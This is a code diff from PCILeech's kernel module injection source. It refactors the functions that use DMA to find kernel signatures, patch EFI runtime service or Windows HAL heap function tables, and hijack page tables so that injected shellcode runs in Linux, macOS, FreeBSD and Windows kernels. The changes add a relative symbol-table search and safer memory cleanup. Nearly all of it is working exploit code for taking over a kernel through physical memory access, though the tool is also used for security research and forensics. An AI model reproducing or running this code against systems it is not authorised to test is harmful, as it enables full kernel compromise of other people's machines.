@@ -25,6 +25,7 @@ typedef struct tdKERNELSEEKER {
     DWORD cbSeek;
     DWORD aSeek;
     DWORD aTableEntry;
+    DWORD aFn;
     QWORD vaSeek;
     QWORD vaFn;
 } KERNELSEEKER, *PKERNELSEEKER;
@@ -34,13 +35,14 @@ typedef struct tdKERNELSEEKER {
 #define STAGE2_OFFSET_FN_STAGE1_ORIG    8
 #define STAGE2_OFFSET_EXTRADATA1        16
 
-BOOL KMD_GetPhysicalMemoryMap();
-BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3);
+_Success_(return) BOOL KMD_GetPhysicalMemoryMap();
+_Success_(return) BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3);
 
 //-------------------------------------------------------------------------------
 // Signature mathing below.
 //-------------------------------------------------------------------------------
 
+_Success_(return)
 BOOL KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ QWORD qwAddrBase, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatch)
 {
     PBYTE pb;
@@ -74,6 +76,7 @@ BOOL KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ QWORD qwA
     return FALSE;
 }
 
+_Success_(return)
 BOOL KMD_FindSignature1(_Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatchIdx)
 {
     BOOL result = FALSE;
@@ -113,6 +116,7 @@ cleanup:
 // EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
 #define IS_SIGNATURE_EFI_RUNTIME_SERVICES(pb) ((*(PQWORD)(pb) == 0x56524553544e5552) && (*(PDWORD)(pb + 12) == 0x88) && (*(PDWORD)(pb + 20) == 0))
 
+_Success_(return)
 BOOL KMD_FindSignature_EfiRuntimeServices(_Out_ PQWORD pqwAddrPhys)
 {
     BOOL result = FALSE;
@@ -181,6 +185,7 @@ BOOL KMD_MacOSIsKernelAddress(_In_ PBYTE pbPage)
     return FALSE;
 }
 
+_Success_(return)
 BOOL KMD_MacOSKernelGetBase(_Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB, _Out_ PDWORD pcbTextHIB)
 {
     BYTE pbPage[4096];
@@ -204,6 +209,7 @@ BOOL KMD_MacOSKernelGetBase(_Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB,
     return FALSE;
 }
 
+_Success_(return)
 BOOL KMD_MacOSKernelSeekSignature(_Out_ PSIGNATURE pSignature)
 {
     const BYTE SIGNATURE_BCOPY[] = { 0x48, 0x87, 0xF7, 0x48, 0x89, 0xD1, 0x48, 0x89, 0xF8, 0x48, 0x29, 0xF0, 0x48, 0x39, 0xC8, 0x72 };
@@ -234,6 +240,7 @@ BOOL KMD_MacOSKernelSeekSignature(_Out_ PSIGNATURE pSignature)
 // FreeBSD generic kernel seek below.
 //-------------------------------------------------------------------------------
 
+_Success_(return)
 BOOL KMD_FreeBSDKernelSeekSignature(_Out_ PSIGNATURE pSignature)
 {
     DWORD i, dwo_memcpy_str, dwo_strtab, dwa_memcpy;
@@ -284,6 +291,7 @@ error:
 // 4.8+ version that works with 64-bit addressing, 32-bit will work too if kernel is KASLRed <4GB.
 //-------------------------------------------------------------------------------
 
+_Success_(return)
 BOOL KMD_LinuxIsAllAddrFoundSeek(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
 {
     DWORD j;
@@ -295,6 +303,7 @@ BOOL KMD_LinuxIsAllAddrFoundSeek(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
     return TRUE;
 }
 
+_Success_(return)
 BOOL KMD_LinuxIsAllAddrFoundTableEntry(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
 {
     DWORD j;
@@ -306,6 +315,7 @@ BOOL KMD_LinuxIsAllAddrFoundTableEntry(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
     return TRUE;
 }
 
+_Success_(return)
 BOOL KMD_LinuxFindFunctionAddr(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
 {
     DWORD o, i;
@@ -322,7 +332,11 @@ BOOL KMD_LinuxFindFunctionAddr(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER 
     return FALSE;
 }
 
-BOOL KMD_LinuxFindFunctionAddrTBL(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
+/*
+* Locate function addresses in symtab with absolute addressing.
+*/
+_Success_(return)
+BOOL KMD_LinuxFindFunctionAddrTBL_Absolute(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
 {
     DWORD o, i;
     for(o = 0x1000; o < cb - 0x1000; o = o + 8) {
@@ -346,8 +360,63 @@ BOOL KMD_LinuxFindFunctionAddrTBL(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEK
     return FALSE;
 }
 
+_Success_(return)
+BOOL KMD_LinuxFindFunctionAddrTBL_RelativeSymTabSearch(_In_ PBYTE pb, _In_ DWORD cb, _In_ DWORD cbStart, _In_ PKERNELSEEKER pS)
+{
+    DWORD o, oFn;
+    for(o = cbStart; o < cb - 8; o += 8) {
+        if(o + *(PDWORD)(pb + o + 4) + 4 == pS->aSeek) {
+            oFn = o + *(PDWORD)(pb + o);
+            if((oFn < 0x02000000) && !(oFn & 0xf) && (oFn != o)) {
+                pS->aTableEntry = o;
+                pS->aFn = oFn;
+                return TRUE;
+            }
+        }
+    }
+    return FALSE;
+}
+
+/*
+* Locate function addresses in symtab with relative addressing.
+*/
+_Success_(return)
+BOOL KMD_LinuxFindFunctionAddrTBL_Relative(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
+{
+    QWORD va, vaBase = (QWORD)-1;
+    DWORD i, o;
+    // 1: Locate virtual address base of kernel by just scanning for lowest value
+    //    of qualifying pointer - dirty but it seems to be working ...
+    for(i = 0, o = pS->aSeek & ~0xf; o < cb - 8; o += 8) {
+        va = *(PQWORD)(pb + o);
+        if(((va & 0xffffffff80000fff) == (0xffffffff80000000)) && (va != 0xffffffff80000000)) {
+            vaBase = min(vaBase, va & 0xffffffffffe00000);
+            if(++i == 0x100) { break; }
+        }
+    }
+    if(vaBase == (QWORD)-1) {
+        return FALSE;
+    }
+    // 2: Locate relative addresses of functions from symtab and fix virtual addresses
+    for(i = 0; i < cS; i++) {
+        if(!KMD_LinuxFindFunctionAddrTBL_RelativeSymTabSearch(pb, cb, ((pS[0].aSeek & ~0xf) - 0x00100000), pS + i)) {
+            return FALSE;
+        }
+        pS[i].vaSeek = vaBase + pS[i].aSeek;
+        pS[i].vaFn = vaBase + pS[i].aFn;
+    }
+    return TRUE;
+}
+
+_Success_(return)
+BOOL KMD_LinuxFindFunctionAddrTBL(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
+{
+    return KMD_LinuxFindFunctionAddrTBL_Absolute(pb, cb, pS, cS) || KMD_LinuxFindFunctionAddrTBL_Relative(pb, cb, pS, cS);
+}
+
 #define CONFIG_LINUX_SEEK_BUFFER_SIZE       0x01000000
 #define CONFIG_LINUX_SEEK_CKSLIDES          512
+_Success_(return)
 BOOL KMD_Linux46KernelSeekSignature(_Out_ PSIGNATURE pSignature)
 {
     BOOL result;
@@ -431,6 +500,7 @@ QWORD KMD_Linux48KernelBaseSeek()
 }
 
 #define KMD_LINUX48SEEK_MAX_BYTES       0x02000000      // 32MB
+_Success_(return)
 BOOL KMD_Linux48KernelSeekSignature(_Out_ PSIGNATURE pSignature)
 {
     BOOL result = FALSE;
@@ -466,13 +536,16 @@ fail:
 // LINUX EFI Runtime Services hijack.
 //-------------------------------------------------------------------------------
 
+_Success_(return)
 BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
 {
     BOOL result;
     QWORD i, o, qwAddrEfiRt;
     DWORD dwPhysAddrS2, dwPhysAddrS3, *pdwPhysicalAddress;
     BYTE pb[0x1000], pbOrig[0x1000], pbEfiRt[0x1000];
-    SIGNATURE oSignature;
+    PSIGNATURE pSignature = NULL;
+    pSignature = LocalAlloc(LMEM_ZEROINIT, sizeof(SIGNATURE));
+    if(!pSignature) { goto fail; }
     //------------------------------------------------
     // 1: Locate and fetch EFI Runtime Services table.
     //------------------------------------------------
@@ -482,28 +555,28 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
     }
     if((qwAddrEfiRt & 0xfff) + 0x88 > 0x1000) {
         printf("KMD: Failed. EFI Runtime Services table located on page boundary.\n");
-        return FALSE;
+        goto fail;
     }
     result = 0x1000 == LeechCore_ReadEx(qwAddrEfiRt & ~0xfff, pbEfiRt, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL);
     if(!result || !IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbEfiRt + (qwAddrEfiRt & 0xfff))) {
         printf("KMD: Failed. Error reading EFI Runtime Services table.\n");
-        return FALSE;
+        goto fail;
     }
     //------------------------------------------------
     // 2: Fetch signature and original data.
     //------------------------------------------------
-    Util_CreateSignatureLinuxEfiRuntimeServices(&oSignature);
-    *(PQWORD)(oSignature.chunk[3].pb + 0x28) = qwAddrEfiRt; // 0x28 == offset data_addr_runtserv.
-    memcpy(oSignature.chunk[3].pb + 0x30, pbEfiRt + (qwAddrEfiRt & 0xfff) + 0x18, 0x70); // 0x30 == offset data_runtserv_table_fn.
+    Util_CreateSignatureLinuxEfiRuntimeServices(pSignature);
+    *(PQWORD)(pSignature->chunk[3].pb + 0x28) = qwAddrEfiRt; // 0x28 == offset data_addr_runtserv.
+    memcpy(pSignature->chunk[3].pb + 0x30, pbEfiRt + (qwAddrEfiRt & 0xfff) + 0x18, 0x70); // 0x30 == offset data_runtserv_table_fn.
     result = 0x1000 == LeechCore_ReadEx(0, pbOrig, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL);
     if(!result) {
         printf("KMD: Failed. Error reading at address 0x0.\n");
-        return FALSE;
+        goto fail;
     }
     //------------------------------------------------
     // 3: Patch wait to reveive execution of EFI code.
     //------------------------------------------------
-    LeechCore_WriteEx(0, oSignature.chunk[3].pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+    LeechCore_WriteEx(0, pSignature->chunk[3].pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
     for(i = 0; i < 14; i++) {
         o = (qwAddrEfiRt & 0xfff) + 0x18 + 8 * i; // 14 tbl entries of 64-bit/8-byte size.
         *(PQWORD)(pbEfiRt + o) = 0x100 + 2 * i; // each PUSH in receiving slide is 2 bytes, offset to code = 0x100.
@@ -534,7 +607,7 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
         Sleep(100);
         if(0x1000 != LeechCore_ReadEx(dwPhysAddrS2, pb, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
-            return FALSE;
+            goto fail;
         }
     } while(!*pdwPhysicalAddress);
     dwPhysAddrS3 = *pdwPhysicalAddress;
@@ -543,22 +616,28 @@ BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
     //------------------------------------------------
     memset(pb, 0, 0x1000);
     LeechCore_Write(dwPhysAddrS2, pb, 0x1000);
-    return KMD_SetupStage3(dwPhysAddrS3, oSignature.chunk[4].pb, 4096);
+    result = KMD_SetupStage3(dwPhysAddrS3, pSignature->chunk[4].pb, 4096);
+    LocalFree(pSignature);
+    return result;
+fail:
+    LocalFree(pSignature);
+    return FALSE;
 }
 
 //-------------------------------------------------------------------------------
 // Windows 8/10 generic kernel implant below.
 //-------------------------------------------------------------------------------
 
-BOOL KMD_Win_SearchTableHalpInterruptController(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
+_Success_(return)
+BOOL KMD_Win_SearchTableHalpApicRequestInterrupt(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
 {
     DWORD i;
     BOOL result;
     for(i = 0; i < (0x1000 - 0x78); i += 8) {
         result =
-            (*(PQWORD)(pbPage + i + 0x18) == 0x28) &&
             ((*(PQWORD)(pbPage + i + 0x00) & ~0xfff) == qwPageVA) &&
             ((*(PQWORD)(pbPage + i + 0x10) & ~0xfff) == qwPageVA) &&
+            ((*(PQWORD)(pbPage + i + 0x18) == 0x28) || (*(PQWORD)(pbPage + i + 0x18) == 0x30)) &&
             ((*(PQWORD)(pbPage + i + 0x78) & 0xffffff0000000000) == 0xfffff80000000000);
         if(result) {
             *dwHookFnPgOffset = i + 0x78;
@@ -568,6 +647,7 @@ BOOL KMD_Win_SearchTableHalpInterruptController(_In_ PBYTE pbPage, _In_ QWORD qw
     return FALSE;
 }
 
+_Success_(return)
 BOOL KMDOpen_UEFI_FindEfiBase()
 {
     PBYTE pb = NULL;
@@ -606,6 +686,7 @@ fail:
     return FALSE;
 }
 
+_Success_(return)
 BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
 {
     BOOL result;
@@ -699,6 +780,7 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
 * It also patches function pointer table in HAL heap to gain initial execution.
 */
 #ifdef WIN32
+_Success_(return)
 BOOL KMDOpen_WINX64_VMM()
 {
     BOOL result = FALSE;
@@ -742,6 +824,7 @@ BOOL KMDOpen_WINX64_VMM()
         goto fail;
     }
     pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
+    if(!pSections) { goto fail; }
     if(!VmmPrx_ProcessGetSections(4, "kdcom.dll", pSections, cSections, &cSections)) {
         printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #2\n");
         goto fail;
@@ -773,6 +856,7 @@ BOOL KMDOpen_WINX64_VMM()
         goto fail;
     }
     pMemMap = LocalAlloc(LMEM_ZEROINIT, cMemMap * sizeof(VMMDLL_MEMMAP_ENTRY));
+    if(!pMemMap) { goto fail; }
     if(!VmmPrx_ProcessGetMemoryMap(4, pMemMap, &cMemMap, FALSE)) {
         printf("KMD: Failed vmm.dll!ProcessGetMemoryMap #2.\n");
         goto fail;
@@ -787,7 +871,7 @@ BOOL KMDOpen_WINX64_VMM()
         for(j = 0; j < pMemMap[i].cPages; j++) {
             vaHook = pMemMap[i].AddrBase + (j << 12);
             VmmPrx_MemReadPage(4, vaHook, pbPage);
-            if(KMD_Win_SearchTableHalpInterruptController(pbPage, vaHook, &dwHookOffset)) {
+            if(KMD_Win_SearchTableHalpApicRequestInterrupt(pbPage, vaHook, &dwHookOffset)) {
                 vaHook += dwHookOffset;
                 goto success_locate_hook; // lvl2 loop breakout with goto
             }
@@ -881,6 +965,7 @@ BOOL KMDOpen_WINX64_VMM()
 // https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
 // HAL is statically located at: ffffffffffd00000 (win8.1/win10 pre 1703)
 // HAL is randomized between: fffff78000000000:fffff7ffc0000000 (win10 1703) [512 possible positions in PDPT]
+_Success_(return)
 BOOL KMDOpen_HalHijack()
 {
     DWORD ADDR_HAL_HEAP_PA = 0x00001000;
@@ -919,7 +1004,7 @@ BOOL KMDOpen_HalHijack()
             Util_PageTable_ReadPTE(qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
             ((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
             (0x1000 == LeechCore_ReadEx((qwPTEOrig & 0xfffff000), pbHal, 0x1000, LEECHCORE_FLAG_READ_RETRY, NULL)) &&
-            KMD_Win_SearchTableHalpInterruptController(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
+            KMD_Win_SearchTableHalpApicRequestInterrupt(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
         if(result) {
             break;
         }
@@ -983,6 +1068,7 @@ BOOL KMDOpen_HalHijack()
 // KMD command function below.
 //-------------------------------------------------------------------------------
 
+_Success_(return)
 BOOL KMD_IsRangeInPhysicalMap(_In_ PKMDHANDLE phKMD, _In_ QWORD qwBaseAddress, _In_ QWORD qwNumberOfBytes)
 {
     QWORD i;
@@ -996,6 +1082,7 @@ BOOL KMD_IsRangeInPhysicalMap(_In_ PKMDHANDLE phKMD, _In_ QWORD qwBaseAddress, _
     return FALSE;
 }
 
+_Success_(return)
 BOOL KMD_SubmitCommand(_In_ QWORD op)
 {
     HANDLE hCallback = NULL;
@@ -1037,6 +1124,7 @@ VOID KMD_PhysicalMemoryMapDisplay(_In_ PKMDHANDLE phKMD)
     printf("----------------------------------------------\n");
 }
 
+_Success_(return)
 BOOL KMD_GetPhysicalMemoryMap()
 {
     QWORD qwMaxMemoryAddress;
@@ -1060,6 +1148,7 @@ BOOL KMD_GetPhysicalMemoryMap()
     return TRUE;
 }
 
+_Success_(return)
 BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3)
 {
     //------------------------------------------------
@@ -1095,6 +1184,7 @@ BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWO
     return TRUE;
 }
 
+_Success_(return)
 BOOL KMDReadMemory_DMABufferSized(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
 {
     BOOL result;
@@ -1108,6 +1198,7 @@ BOOL KMDReadMemory_DMABufferSized(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWO
     return (cb == DeviceReadDMAEx(ctxMain->pk->DMAAddrPhysical, pb, cb, NULL, 0)) && ctxMain->pk->_result;
 }
 
+_Success_(return)
 BOOL KMDWriteMemory_DMABufferSized(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
 {
     BOOL result;
@@ -1121,6 +1212,7 @@ BOOL KMDWriteMemory_DMABufferSized(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWO
     return KMD_SubmitCommand(KMD_CMD_WRITE) && ctxMain->pk->_result;
 }
 
+_Success_(return)
 BOOL KMDReadMemory(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
 {
     DWORD dwDMABufferSize = (DWORD)ctxMain->pk->DMASizeBuffer;
@@ -1136,6 +1228,7 @@ BOOL KMDReadMemory(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
     }
 }
 
+_Success_(return)
 BOOL KMDWriteMemory(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
 {
     DWORD dwDMABufferSize = (DWORD)ctxMain->pk->DMASizeBuffer;
@@ -1169,57 +1262,60 @@ VOID KMDClose()
     }
 }
 
+_Success_(return)
 BOOL KMDOpen_MemoryScan()
 {
-    SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
-    PSIGNATURE pSignature;
+    PSIGNATURE pSignature, pSignatures = NULL;
     DWORD dwSignatureMatchIdx, cSignatures = CONFIG_MAX_SIGNATURES;
     KMDHANDLE_S12 h1, h2;
     PDWORD pdwPhysicalAddress;
+    BOOL result;
+    pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE));
+    if(!pSignatures) { goto fail; }
     //------------------------------------------------
     // 1: Load signature
     //------------------------------------------------
     if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_46")) {
-        if(!KMD_Linux46KernelSeekSignature(&oSignatures[0])) {
+        if(!KMD_Linux46KernelSeekSignature(&pSignatures[0])) {
             printf("KMD: Failed. Error locating generic linux kernel signature.\n");
-            return FALSE;
+            goto fail;
         }
-        pSignature = &oSignatures[0];
+        pSignature = &pSignatures[0];
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_48")) {
-        if(!KMD_Linux48KernelSeekSignature(&oSignatures[0])) {
+        if(!KMD_Linux48KernelSeekSignature(&pSignatures[0])) {
             printf("KMD: Failed. Error locating generic linux kernel signature.\n");
-            return FALSE;
+            goto fail;
         }
-        pSignature = &oSignatures[0];
+        pSignature = &pSignatures[0];
     } else if((0 == _stricmp(ctxMain->cfg.szKMDName, "MACOS")) || (0 == _stricmp(ctxMain->cfg.szKMDName, "OSX_X64"))) {
-        if(!KMD_MacOSKernelSeekSignature(&oSignatures[0])) {
+        if(!KMD_MacOSKernelSeekSignature(&pSignatures[0])) {
             printf("KMD: Failed. Error locating generic macOS kernel signature.\n");
-            return FALSE;
+            goto fail;
         }
-        pSignature = &oSignatures[0];
+        pSignature = &pSignatures[0];
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "FREEBSD_X64")) {
-        if(!KMD_FreeBSDKernelSeekSignature(&oSignatures[0])) {
+        if(!KMD_FreeBSDKernelSeekSignature(&pSignatures[0])) {
             printf("KMD: Failed. Error locating generic FreeBSD kernel signature.\n");
-            return FALSE;
+            goto fail;
         }
-        pSignature = &oSignatures[0];
+        pSignature = &pSignatures[0];
     } else {
-        if(!Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", oSignatures, &cSignatures, 5)) {
+        if(!Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", pSignatures, &cSignatures, 5)) {
             printf("KMD: Failed. Error loading signatures.\n");
-            return FALSE;
+            goto fail;
         }
         //------------------------------------------------
         // 2: Locate patch location (scan memory).
         //------------------------------------------------
-        if(!KMD_FindSignature1(oSignatures, cSignatures, &dwSignatureMatchIdx)) {
+        if(!KMD_FindSignature1(pSignatures, cSignatures, &dwSignatureMatchIdx)) {
             printf("KMD: Failed. Could not find signature in memory.\n");
-            return FALSE;
+            goto fail;
         }
-        pSignature = &oSignatures[dwSignatureMatchIdx];
+        pSignature = &pSignatures[dwSignatureMatchIdx];
     }
     if(!pSignature->chunk[2].cb || !pSignature->chunk[3].cb) {
         printf("KMD: Failed. Error loading shellcode.\n");
-        return FALSE;
+        goto fail;
     }
     //------------------------------------------------
     // 3: Set up patch data.
@@ -1245,11 +1341,11 @@ BOOL KMDOpen_MemoryScan()
     //------------------------------------------------
     if(!LeechCore_WriteEx(h2.qwPageAddr, h2.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL | PCILEECH_MEM_FLAG_VERIFYWRITE)) {
         printf("KMD: Failed. Signature found but unable write #2.\n");
-        return FALSE;
+        goto fail;
     }
     if(!LeechCore_Write(h1.qwPageAddr, h1.pbPatch, 4096)) { // stage1 (must be written after stage2)
         printf("KMD: Failed. Signature found but unable write #1.\n");
-        return FALSE;
+        goto fail;
     }
     printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
     //------------------------------------------------
@@ -1260,7 +1356,7 @@ BOOL KMDOpen_MemoryScan()
         Sleep(100);
         if(4096 != LeechCore_ReadEx(h2.qwPageAddr, h2.pbLatest, 4096, LEECHCORE_FLAG_READ_RETRY, NULL)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
-            return FALSE;
+            goto fail;
         }
     } while(!*pdwPhysicalAddress);
     printf("KMD: Execution received - continuing ...\n");
@@ -1271,37 +1367,42 @@ BOOL KMDOpen_MemoryScan()
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
-    return KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
+    result = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
+    return result;
+fail:
+    return FALSE;
 }
 
+_Success_(return)
 BOOL KMDOpen_PageTableHijack()
 {
     QWORD qwCR3 = ctxMain->cfg.qwCR3;
     QWORD qwModuleBase;
-    SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
-    PSIGNATURE pSignature;
+    PSIGNATURE pSignature, pSignatures = NULL;
     DWORD cSignatures = CONFIG_MAX_SIGNATURES;
     KMDHANDLE_S12 h1, h2;
     PSIGNATUREPTE pSignaturePTEs;
     QWORD cSignaturePTEs;
     PDWORD pdwPhysicalAddress;
     BOOL result;
+    pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE));
+    if(!pSignatures) { goto fail; }
     //------------------------------------------------
     // 1: Load signature and patch data.
     //------------------------------------------------
-    result = Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", oSignatures, &cSignatures, 6);
+    result = Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", pSignatures, &cSignatures, 6);
     if(!result) {
         printf("KMD: Failed. Error loading signatures.\n");
-        return FALSE;
+        goto fail;
     }
     if(cSignatures != 1) {
         printf("KMD: Failed. Singature count differs from 1. Exactly one signature must be loaded.\n");
-        return FALSE;
+        goto fail;
     }
-    pSignature = &oSignatures[0];
+    pSignature = &pSignatures[0];
     if(pSignature->chunk[0].cb != 4096 || pSignature->chunk[1].cb != 4096) {
         printf("KMD: Failed. Signatures in PTE mode must be 4096 bytes long.\n");
-        return FALSE;
+        goto fail;
     }
     pSignaturePTEs = (PSIGNATUREPTE)pSignature->chunk[5].pb;
     cSignaturePTEs = pSignature->chunk[5].cb / sizeof(SIGNATUREPTE);
@@ -1314,17 +1415,17 @@ BOOL KMDOpen_PageTableHijack()
     result = Util_PageTable_FindSignatureBase(&qwCR3, pSignaturePTEs, cSignaturePTEs, &qwModuleBase);
     if(!result) {
         printf("KMD: Failed. Could not find module base by PTE search.\n");
-        return FALSE;
+        goto fail;
     }
     result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[2].cbOffset, &h1.qwPTEOrig, &h1.qwPTEAddrPhys);
     if(!result) {
         printf("KMD: Failed. Could not access PTE #1.\n");
-        return FALSE;
+        goto fail;
     }
     result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[3].cbOffset, &h2.qwPTEOrig, &h2.qwPTEAddrPhys);
     if(!result) {
         printf("KMD: Failed. Could not access PTE #2.\n");
-        return FALSE;
+        goto fail;
     }
     //------------------------------------------------
     // 3: Set up patch data.
@@ -1359,7 +1460,7 @@ BOOL KMDOpen_PageTableHijack()
     if(!LeechCore_WriteEx(h2.qwPageAddr, h2.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL | PCILEECH_MEM_FLAG_VERIFYWRITE) ||
         !LeechCore_WriteEx(h1.qwPageAddr, h1.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL | PCILEECH_MEM_FLAG_VERIFYWRITE)) {
         printf("KMD: Failed. Signature found but unable write.\n");
-        return FALSE;
+        goto fail;
     }
     LeechCore_Write(h2.qwPTEAddrPhys, (PBYTE)&h2.qwPTE, sizeof(QWORD));
     Sleep(250);
@@ -1373,7 +1474,7 @@ BOOL KMDOpen_PageTableHijack()
         Sleep(100);
         if(4096 != LeechCore_ReadEx(h2.qwPageAddr, h2.pbLatest, 4096, LEECHCORE_FLAG_READ_RETRY, NULL)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
-            return FALSE;
+            goto fail;
         }
     } while(!*pdwPhysicalAddress);
     printf("KMD: Execution received - continuing ...\n");
@@ -1388,9 +1489,13 @@ BOOL KMDOpen_PageTableHijack()
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
-    return KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
+    result = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
+    return result;
+fail:
+    return FALSE;
 }
 
+_Success_(return)
 BOOL KMD_SetupStage3_FromPartial()
 {
     BYTE pb[4096];
@@ -1405,6 +1510,7 @@ BOOL KMD_SetupStage3_FromPartial()
     }
 }
 
+_Success_(return)
 BOOL KMDOpen_LoadExisting()
 {
     //------------------------------------------------
@@ -1438,6 +1544,7 @@ fail:
     return FALSE;
 }
 
+_Success_(return)
 BOOL KMDOpen()
 {
     if(ctxMain->cfg.qwKMD) {
